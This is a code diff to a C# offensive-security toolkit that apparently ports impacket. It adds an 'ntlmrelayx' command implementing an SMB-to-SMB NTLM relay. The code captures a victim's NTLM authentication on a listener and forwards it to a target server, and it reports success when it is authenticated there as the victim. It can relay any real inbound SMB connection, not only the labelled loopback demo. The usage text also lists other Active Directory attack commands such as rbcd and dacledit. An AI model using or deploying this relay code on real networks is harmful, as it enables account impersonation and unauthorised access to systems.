@@ -1391,6 +1391,73 @@ switch (args[0])
         return 2;
     }
 
+    case "ntlmrelayx":
+    {
+        // ntlmrelayx.py (SMB->SMB relay core): an SMB2 server that relays a victim's NTLM
+        // authentication to a target SMB server. The victim's AUTHENTICATE is computed against the
+        // TARGET's challenge (which we relay back), so a successful relay authenticates us to the
+        // target as the victim. See impacket examples/ntlmrelayx/servers/smbrelayserver.py.
+        //
+        // LAB-ONLY. For a self-contained loopback demo, pass victim creds and the example drives a
+        // victim against its own listener; the relay forwards to <target-host>. With no victim creds
+        // it listens and relays the next real inbound SMB connection (the classic coerced-auth setup).
+        if (args.Length < 2)
+        {
+            Console.Error.WriteLine("usage: ntlmrelayx <target-host> [listen-port=4455] [victim-user victim-pass [domain]]");
+            Console.Error.WriteLine("  demo (loopback): ntlmrelayx 127.0.0.1 4455 Administrator 'LabAdm1n!Pass' lab.local");
+            Console.Error.WriteLine("  listen only    : ntlmrelayx <target-host> [listen-port]");
+            return 2;
+        }
+
+        string targetHost = args[1];
+        int listenPort = args.Length > 2 ? int.Parse(args[2]) : 4455;
+        bool haveVictim = args.Length >= 5;
+        string vUser = haveVictim ? args[3] : string.Empty;
+        string vPass = haveVictim ? args[4] : string.Empty;
+        string vDomain = args.Length > 5 ? args[5] : string.Empty;
+
+        using var server = new Smb2RelayServer(listenPort, System.Net.IPAddress.Loopback);
+        server.Start();
+        Console.WriteLine($"[*] ntlmrelayx (SMB->SMB) listening on 127.0.0.1:{server.Port}, relaying to {targetHost}");
+
+        // Open the relay connection to the real target up front (NEGOTIATE done here).
+        using var target = new Smb2RelayClientTarget(targetHost);
+
+        // Optional loopback victim: authenticate against our own listener in the background.
+        System.Threading.Tasks.Task? victimTask = null;
+        if (haveVictim)
+        {
+            Console.WriteLine($"[*] (demo) driving a victim '{vUser}' against the listener");
+            victimTask = System.Threading.Tasks.Task.Run(() =>
+            {
+                using var victim = new Smb2Client();
+                victim.Connect("127.0.0.1", listenPort);
+                victim.Negotiate();
+                victim.Login(vDomain, vUser, vPass);
+            });
+        }
+        else
+        {
+            Console.WriteLine("[*] waiting for an inbound SMB connection to relay...");
+        }
+
+        Smb2RelayOutcome outcome = server.AcceptAndRelay(target);
+
+        Console.WriteLine($"[*] victim {outcome.VictimEndpoint} relayed to {targetHost}");
+        Console.WriteLine($"    relayed challenge (target's): {Convert.ToHexString(outcome.RelayedChallenge).ToLowerInvariant()}");
+        if (outcome.Relayed)
+        {
+            Console.WriteLine($"[+] Relay SUCCEEDED: authenticated to {targetHost} as the victim (target session 0x{target.Client.SessionId:X}).");
+        }
+        else
+        {
+            Console.WriteLine($"[-] Relay failed: target returned {NtStatus.Describe(outcome.TargetStatus)} (0x{outcome.TargetStatus:X8}).");
+        }
+
+        try { victimTask?.Wait(5000); } catch { /* victim may error after relay completes; not fatal */ }
+        return outcome.Relayed ? 0 : 1;
+    }
+
     case "get-adcomputers":
     {
         // GetADComputers.py: LDAP-search a DC for all computer objects and print
@@ -4576,6 +4643,7 @@ static void PrintUsage()
     Console.WriteLine("  dacledit <read|write|remove|backup|restore> <host> <user> <password> <domain-fqdn> <target> [principal] [rights] [ace-type] [file]   # dacledit: read/edit an object's DACL (lab)");
     Console.WriteLine("  owneredit <read|write> <host> <user> <password> <domain-fqdn> <target> [new-owner]   # owneredit: read/set an object's owner (lab)");
     Console.WriteLine("  rbcd <read|write|remove|flush> <host> <user> <password> <domain-fqdn> <delegate-to> [delegate-from]   # rbcd: msDS-AllowedToActOnBehalfOfOtherIdentity (lab)");
+    Console.WriteLine("  ntlmrelayx <target-host> [listen-port] [victim-user victim-pass [domain]]   # ntlmrelayx: SMB->SMB NTLM relay (lab)");
     Console.WriteLine("  rpc-services <host> <user> <password> [domain] [port]");
     Console.WriteLine("                   List installed services via svcctl REnumServicesStatusW (services.py list).");
     Console.WriteLine("  rpc-svcconfig <host> <user> <password> <service> [domain] [port]");
